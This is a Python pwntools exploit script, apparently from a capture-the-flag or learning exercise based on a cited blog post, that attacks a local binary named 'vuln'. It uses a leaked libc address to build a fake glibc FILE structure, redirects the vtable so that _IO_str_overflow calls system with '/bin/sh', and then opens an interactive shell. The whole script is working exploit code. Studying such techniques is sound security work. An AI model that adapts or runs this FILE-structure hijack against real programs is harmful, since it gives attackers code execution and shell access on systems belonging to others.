"""
Exploit script for 'vuln'

https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
"""

from pwn import *

# For gdb
# context.terminal = ['tmux', 'splitw', '-h']

# A handy function to craft FILE structures
def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = b''
    struct += p32(_flags)
    struct += p32(0)
    struct += p64(_IO_read_ptr)
    struct += p64(_IO_read_end)
    struct += p64(_IO_read_base)
    struct += p64(_IO_write_base)
    struct += p64(_IO_write_ptr)
    struct += p64(_IO_write_end)
    struct += p64(_IO_buf_base)
    struct += p64(_IO_buf_end)
    struct += p64(_IO_save_base)
    struct += p64(_IO_backup_base)
    struct += p64(_IO_save_end)
    struct += p64(_IO_marker)
    struct += p64(_IO_chain)
    struct += p32(_fileno)
    struct = struct.ljust(0x88, b"\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, b"\x00")
    return struct

# Loading the vulnerable binary
exe = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln_patched')

# Attaching with gdb, uncomment while debugging
gdb.attach(p,"""b *main""")

sleep(5)
# Using the leaked libc address to calculate the base
p.recvuntil(b"Leaking libc address of stdout:\n")
stdout_addr = int(p.recvline().strip(), 16)
libc_base = stdout_addr - 0x3c2600
print("Libc base: " + hex(libc_base))
# Our target
rip = libc_base + libc.symbols['system']
rdi = libc_base + next(libc.search(b"/bin/sh")) # The first param we want

# We can only have even rdi
assert(rdi % 2 == 0)

# Crafting FILE structure

# This stores the address of a pointer to the _IO_str_overflow function
# Libc specific
io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
# Calculate the vtable by subtracting appropriate offset
fake_vtable_addr = io_str_overflow_ptr_addr - 2*8

# Calculate values as integers (and ensure division is integer division)
fake_val = (rdi - 100)//2

file_struct = pack_file(
    _IO_buf_base = 0,
    _IO_buf_end = fake_val,
    _IO_write_ptr = fake_val,
    _IO_write_base = 0,
    _lock = exe.symbols['fake_file'] + 0x80
)
# vtable pointer
file_struct += p64(fake_vtable_addr)
# Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
file_struct += p64(rip)

file_struct = file_struct.ljust(0x100, b"\x00")

write("p",file_struct)
p.send(file_struct)

# Launching shell
p.interactive()